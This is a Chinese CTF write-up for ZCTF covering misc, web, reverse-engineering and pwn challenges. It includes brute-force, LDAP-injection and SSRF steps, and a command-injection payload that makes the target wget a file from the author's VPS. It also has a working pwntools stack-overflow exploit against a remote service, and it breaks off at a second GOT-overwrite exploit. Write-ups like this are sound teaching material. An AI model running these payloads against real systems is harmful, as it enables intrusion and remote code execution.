Nu1L-ZCTF-Writeup 
——By Nu1L 全员 
部分脚本请见附件 
Misc 类 
Misc10-签到题 
直接新浪微博搜下： 
MISC100  xctf 竞赛规则 
开始完全没思路，解压 word 得到的 document.xml 发现一堆烫然而并没有什
么思路，后来根据提示宽窄间距，想到是烫的间距，利用 python 的 xml 库写一
个小的脚本就可以得到一串 01，转化 ascii 就可以了。中间需要注意的是不能光
提取 xml 的间距，还需要乘上中间的烫的个数。 
import  xml.dom.minidom 
import sys 
reload(sys) 
sys.setdefaultencoding('gbk') 
dom = xml.dom.minidom.parse('document.xml') 
root = dom.documentElement 
str1 = '' 
bb = root.getElementsByTagName('w:spacing') 
b= bb[10] 
b1 = b.getAttribute("w:val") 
print b1 
for k in range(10,len(bb)): 
    if bb[k].getAttribute("w:val") == "2" : 
        str1 += '1' * 
len(str(bb[k].parentNode.parentNode.getElementsByTagName
('w:t')[0].childNodes[0].data).decode('gbk')) 
    elif bb[k].getAttribute("w:val") == "-2" : 
        str1 += '0' * 
len(str(bb[k].parentNode.parentNode.getElementsByTagName
('w:t')[0].childNodes[0].data).decode('gbk')) 
print str1 
print len(str1) 
#print len(bb) 
Misc100-码魂 
百度了下。。。真有小绿和小蓝那个动漫，在第 19 集上得到提示： 
Hex 编辑器看一下题目给的图片： 
和漫画差不多，我们将小数点后的十进制转换成二进制在转换成 16 进制： 
这是段 shellcode，我这个 web 狗是不知道。。。交给队友，果断编译了出来： 
然后根据主办方的提示，zctf 是秘钥，同时是 8 字节，猜测是 asii 码，利用
py 的 pyDes 库写了个小脚本就可以了： 
Web 类 
Web100  老大 
首先是爆破，尝试各种弱口令无果。第一天快结束，队友爆破出来了第一个
弱口令：zhangwei 密码 123456。直到第二天，白天，登录进去发现有 20 个人
名，发现一个 md5 后的 cookie，不能解出来。
于是自行构造所有的用户名的全拼和密码字典，密码字典选用 3389 的常用
字典，爆破出第二个弱口令：niubenben 密码 123456789。。（吐槽一下，要不是
以前看过一个电视剧叫铁齿铜牙纪晓岚，我还真不知道这个字怎么读），登录进
去，提示老大知道 flag。 
然后发现 cookie，解 md5 得到 9+ADk-， 
根据经验，解 utf-7，发现是 99， 
猜测构造是第一位是顺序，后面是顺序呢 utf-7 编码。所以把 1 编码后补上
变成 1+ADE-，然后 md5，改 coockie 得到 flag
Web150-Injection 
一个注入，其实不难。。。主要是不太熟悉罢了，LDAP 注入 
在乌云有这么一篇文章写得很详细：http://drops.wooyun.org/tips/967 
根据 LDAP 的特性，我们可以利用特殊符“*”去替换过滤器中的一个或多个字
符，经过测试： 
admin *，进入 search 页面： 
输入 test 后发现 
再次发现通配符*，发现正确可以回显，不正确不能回显，并且输入有长度
限制。 
令 uid=*，构造)(2=，以形成(|(uid=*)(2=*)) 
然后看了下 cookie，有东西： 
猜测 description 是一个参数，于是构造：test)(description= 
随机输入字符，当 test)(description=z 时有正确回显，于是利用 burp 诸位爆
破： 
得到 flag：zctf{303a61ace0204a2d5f352771d6f1bba2} 
Web300 
题目提示侧漏了，想到备份文件泄露，尝试 index.php~,.index.php.swp, 
index.php.swp, index.php.bak,发现. index.php.swp 存在，下载下来整理一下得到
简单分析得知首先要绕过时间种子获得路径，看到下面那个 ttr_random 很
熟悉，找了找，在 wechall 上找到原题和绕过方法
https://github.com/rk700/rk700.github.io/blob/master/_posts/2014-06-18-time-to-
reset.md，写了一个 php 脚本在 windows 怎么也不行，在 kali 下一次成功，我
也是醉了 
然后，继续分析源码，发现题目更熟悉，是 hitcon2015 的题目，做过，在
http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%2
0300%20Writeup.html 找到以前做题时用过的方法，ftp 重定向，在我的 vps1 上
构造 index.php，内容如下：
在我的 vps2 上搭建 ftp 服务器，开启匿名访问，在匿名访问根路径构造
内容如下：
然后，由于题目过滤了 mk，直接在远程文件下载即可，构造 payload：
args[]=s%0a&args[]=wget&args[]=2032836944%0a，其中 2032836944 转化为 ip 就
是我 vps1 的 ip45.78.40.114，然后根据执行后得到的 cookie 碰撞时间种子，得
到 16 位路径，访问得到 flag
Web400-百度内网漫游 
被一个&号坑了好久。。。 
题目给了一篇 wooyun 文章，通过查看得知是 ssrf，随意在搜索框输入，返
回百度的内容。 
抓包，发现有一个 link 参数，根据 ssrf 的特性，确认此处存在 ssrf 漏洞。于
是我们要做的就是利用这个参数去访问其内网，但是经过测试发现，其过滤了 IP，
于是在自己的 vps 上放了一个 302 跳转： 
构造方式即：link=www.xxxxxx.com/302.php?url=127.0.0.1:port。所以下一步
我们需要去爆破端口号： 
902 是阿里云的虚拟端口…这也是个坑，于是得到第一个端口是 80 端口。 
查看主页源码，发现 css 有一个提示是 ba1du： 
发现最下面跟了一个新的 css，但是不能直接打开，提示 forbidden，于是 ssrf
过去，查看源码： 
得到内网域名，进行访问： 
到这，下面就和 wooyun 的文章基本一样了，先爆破端口： 
端口都是一样的。。。然后这个时候并不知道这道题目一个至关重要的参数，
没法去连接 127，偶然点了下导航栏下面的图片，直接给跳回去，但是发现地址
栏多了一些东西，瞬间菊花一紧，看到 src，以及 online 几个参数，于是就去爆
破咯，在这里又发现两个小坑把，第一个就是在这里也过滤了 ip，依然需要跳转。
第二就是&要 url 编码，天真的我没想那么多，构造好了就直接去 post，结果点
了 n 次，没反应我擦，最后发现，&不编码就和 link 并列了。。。尴尬，换成%26
就好了,online=2： 
但是不能执行命令： 
于是爆破 online 那个参数： 
把 2 换成 8 就 OK 了，得到最后 flag： 
Re 类 
Reverse100 
第一个验证的关键代码： 
这部分是一个以给出的 16 个字符串的前 16 个字符的 ASCII 码做系数（去掉
空格，逗号，句号），上面的 v17 数组的 16 个数做结果，求一个 16 元 1 次方程
组 
A: 
B: 
解为： 
转换为字符串得到一个假 flag:zctf{Wrong_Flag} 
第二个验证的关键代码为： 
这部分验证真正的 flag 的前四个字符是否和假 flag 的前四个字符相等，之后
是求前 5 个字符的 ASCII 码的和是否为 v17[0]，依次判断前几个字符的累加和，
最后写个脚本逆推之，正确的 flag 是 zctf{So_Easy_Oh_God} 
Re200: 
是个调试版本的 Bin，程序员的恶习一目了然。。。~_~ 
准备:长度 0~30， 
input[28]=’}’  && input[8] == '_' && input[13] == '_' && input[17] == '_' 
即 ZCTF{***_****_***_********} 
第一部分：MD5:371265e33e8d751d93b148067c36eb4c 
第二部分：MD5:03d2370991fbbb9101dd7dcf4b03d619 
     和 371265e33e8d751d93b148067c36eb4c 逐字做差得到 
但是由于在末尾补了一个 0，导致各大 md5 网站均无法成功解密，所以此段
是废的 
第三部分：由 sub_412060 中 RTR0 base64 解密得到 
第四部分：整个 flag 字符串 md5 值为 06f66ccdb372c6270545136bb203ca6e 
SubKey 的奇数位由 input[18]异或解密 
SubKey 的偶数位由 input[19]异或解密 
尝试发现不可能全部为可见字符，猜测里面可能连续相同字节（其实是绝望
时把UltraEdit 里面随便看到的 STSTSTST 带进去试了一下），发现 S、T 为input[18]、
input[19]，解密发现是 Rar 开头的，于是直接解压，发现里面是最后 8 个字节 
Flag:ZCTF{c0c_LIK3_E4t_6aw4ErrY} 
Re300-I love arm 
第一步是在 sub_4009e4 中对输入的字符串进行 base64 中的一个运算，把每
三个字符转换为要从置换表中置换的四个索引值： 
第二步是把索引值分为 5 个一组，每组做 5 次循环运算，每次运算中 5 个索
引值分别跟 dword_4112C8 对应的值相乘之后再相加，每次循环算出一个值，最
后把这组值与 dword_411330 的值进行对比判断是否相等： 
逆推也就是求四组五元一次方程组，其中每组的系数都相等 
A： 
四组 B: 
求出的索引值为： 
根据 base64 的算法把索引值还原成原字符得到 flag：ZCTF{x~Uo#w3ig} 
AndroidRe400 
神奇的分数，感觉很简单。。。 
直接上 jeb，自己就识别了一个 ViewClickListener 类，然后继续跟进 onClick 
有 Input Is Too Long、 Input Is Too Short 之类的字符串，猜测是验证函数。 
挨个看了一下那些自动命名的类，发现有个类包含了很多工具性的函数，例
如执行命令、读写文件的函数，于是先分析了一下。接着回到 onClick，发现其以
Package 的 MD5Signature 为密钥解密并释放了 libListener，之后修改权限为 777
并执行。 
于是直接写了个 java 程序（import 有点多，见附件，要编译的话自行重命
名） 
解密得到 libListener，分析得到程序首先用/proc/pid/status 的惯用方法检测
调试器，接着在本地绑定 16415 端口 
并接收长度为 0x21 的数据，使用 TEA 算法进行解密 
之后程序进行了 Base64 加密，只不过之前的 Table 不是默认的表，变成
了 
GHgSTU45IMNesVlZadrXf17qBCJkxYWhijOyzbcR6tDPw023KLA8QEFuvmnop
9+/ 
思考一下，发觉直接按照对应的位置，换成原来的表就好了。 
之后程序将 Base64 编码后的字符串与一个表按字节逐个异或，并将结
果相加，要求最后和为 0。由于最多只有 32 位，所以不可能是 int 溢出，因
此只能是全是 0（可能分析的不大对，他用的 movsx 带符号扩展，理论上可
以实现，当时就没想那么多，事后发现有问题。。。） 
最后写出程序（见附件） 
得到 Base64: emN0ZntpX2QwTigpVF9MMWszXzIwNDh9 
Flag: zctf{i_d0N()T_L1k3_2048}  
Re500 
疯狂的一连串跳转。。。 
拿到题目，直接拖 IDA。Win 的题竟然没有任何加密壳、压缩壳保护，
真是少见。 
先是 _cfltcvt_init 初始化了一个长长的函数表，不知道干啥用的 
然后 0x402470 里面的函数初始化了一些地址，这些地址每个都加了 5，
看起来应该是很古老的绕过 BreakPoint 的方法。 
然后程序创建了一个线程。分析得知这个线程掌管着结果的验证，每隔
100ms 新建一个类，并拷贝相应的信息，用于验证。 
有 VC++类，于是直接上 ClassInformer 找到 CVerify 的 vftable 
大概知道干嘛的了，回到 main 
main 除了刚才的那些操作，就只剩下调用 0x401E10 这个函数了 
仔细分析之，发现在不停的跳转。开始以为是一个虚拟机，但是发现并
没有任何对 P-Code 的解析，跳转的顺序完全由刚才_cfltcvt_init 设置。 
大概重新把每个地址都创建了函数，一看竟然有 300 个跳转，顿时感觉
前途渺茫，于是萌发了写 Python 脚本提取的思想。正好前几天刚刚研究过，
于是把这些函数的对应的跳转地址做成一个 dict，并输出需要修正的跳转
的地址（脚本见附件） 
中间还是很曲折的。。idaPython 的 logging 貌似有问题，怎么着也输
出不了，于是怒改成输入到文件，得到了 asm.bin 和 log.txt，按照他们重
新修正，得到了新的程序，之后分析算法。 
早在一开始的时候 PEiD 分析显示有 Base64 表，就猜是不是真的有，
到现在很显然了。载入进来，改成高端字节序，处理最高三个字节。 
DWORD 的构成是这样的：ch cl ah al 
于是内存中是这样的：al ah cl ch 
然后程序执行 xor ah,al，xor ah,cl，xor cl,ch xor 前一个字
节,saved_al 
于是显然 前一个←al←ah←cl←ch，所以只需要知道最后一个字符即
可向前推出所有字符 
接下来回到刚才的类，验证函数和将输入分别 0-52 异或，得到结果与
内置表比较。 
于是写出程序（见附件），得到 Base64 结果 
WkNURntJX1c0TlRfSm1QX2pNcF8mJl9CNFMxXzY0X0BeX15AIX0= 
解密得到 Flag:ZCTF{I_W4NT_JmP_jMp_&&_B4S1_64_@^_^@!} 
Pwn 类 
- guess (pwn 100) 
gets 造成了栈溢出，但是由于有 stack canary 的保护所以没办法做 rop。程序把 flag 读到一
块固定的内存区域进行后续操作，所以只要能够 dump 那块区域的内存就可以。通过修改栈
上面 argv[0]的值到 flag 区域就可以在__stack_chk_fail 后弹出的错误信息里把运算后的 flag
弹出来，然后异或解密就行。 
脚本： 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
from pwn import * 
# http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf 
# len = 34 
# 0x7ffc8f36e970 -> 0x7ffc8f36ea98 
addr = 0x6010C5 
def main(): 
# phase 1 : guess len 
for i in range(40): 
payload = i*'a' 
io = remote('115.28.27.103',22222) 
print io.recvuntil('\n') 
io.sendline(payload) 
result = io.recvuntil('\n') 
if 'ZCTF' in result: 
print 'len = ',i 
io.close() 
break 
io.close() 
# phase 2 : overwrite argv[0] to dump encrypted flag 
io = remote('115.28.27.103',22222) 
#io = process('./guess') 
payload = 'ZCTF{'+(i-5)*'\x01'+'\x00'+'\x01'*(40-i-1)+'\x00'*(296-
40)+p64(addr) 
print io.recvuntil('\n') 
#raw_input('attach!') 
io.sendline(payload) 
io.interactive() 
# phase 3 : decrypt flag 
e = ' Sd`000X^o22E^u1^8tdrR^gmAf>|\x0b' 
k = [] 
for c in e: 
k.append(chr(ord(c)^0x1)) 
print 'ZCTF{'+''.join(k) 
return 0 
if __name__ == '__main__': 
main() 
- note1 (pwn 200) 
edit 操作越界导致溢出，可以修改指向下一个 note 的指针，造成任意地址可写。将溢出后
的位置指向 got 表可以泄露 libc 地址，然后算出 system 的地址，将 atoi 改为 system，传
/bin/sh 拿 shell。 
脚本： 
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 